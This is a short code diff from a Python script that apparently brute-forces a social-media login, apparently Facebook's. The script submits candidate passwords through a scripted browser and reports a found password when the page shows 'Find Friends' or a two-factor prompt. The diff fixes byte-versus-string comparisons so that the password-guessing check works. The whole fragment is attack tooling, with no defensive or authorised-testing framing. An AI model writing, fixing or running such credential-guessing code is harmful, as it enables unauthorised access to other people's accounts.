@@ -40,7 +40,7 @@ while True:
             browser.form['pass'] = passw
             response = browser.submit()
             response_data = response.read()
-            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+            if b'Find Friends' in response_data or b'Two-factor authentication' in response_data or b'security code' in response_data:
                 decoded_response = response_data.decode('utf-8')
                 print('Your password is:', passw)
                 print('Response Data:', decoded_response)
@@ -48,4 +48,4 @@ while True:
     except Exception as e:
         print('Error:', e)
 else:
-    print('Response Data:', response_data)
+    print('Response Data:', response_data.decode('utf-8'))
